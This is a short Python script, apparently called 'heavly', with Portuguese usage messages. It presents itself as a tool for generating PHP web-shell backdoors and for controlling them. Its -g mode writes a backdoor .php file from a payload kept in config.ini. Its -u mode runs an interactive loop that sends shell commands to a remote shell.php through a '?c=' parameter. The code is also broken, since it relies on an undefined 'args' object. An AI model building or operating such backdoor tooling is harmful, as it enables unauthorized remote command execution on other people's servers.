from configparser import ConfigParser
from requests import get
from time import sleep
import sys

def inicio():
  print ("Bem vindo ao heavly! \n")
  print ("Você não inseriu nenhum argumento! \n")
  print ("Como usar: \n")
  print ("Gerar backdoor: heavly.py -g NomeDoBackdoor SenhaDoBackdoor \n")
  print ("Conectar ao servidor: heavly.py -u http://localhost/shell.php senha")
  print ("Qualquer dúvida, ler o README.md")
  

argumentoA = sys.argv[0]


for i in range(50):
    print("/-\|"[i % 4], end="\b")
    sys.stdout.flush()
    sleep(0.1)

try:
    if sys.argv[1] == "-u":
        pwd = get(args.shell_url + "?c=pwd").text.replace("\n", "")
        pwd += "$ "
        while True:
            command = input(pwd)
            result = get(args.shell_url + "?c=" + command).text
            print(result)
    if sys.argv[1] == "-g":
        shell_name = str(args.generate)
        shell = shell_name+'.php'
        opfile = open(shell,'+w')
        config = ConfigParser()
        config.read_file(open('config.ini'))

        opfile.write(config['DEFAULT']['code'])
        opfile.close()
        print('Generated file '+shell)
except IndexError:
  inicio()
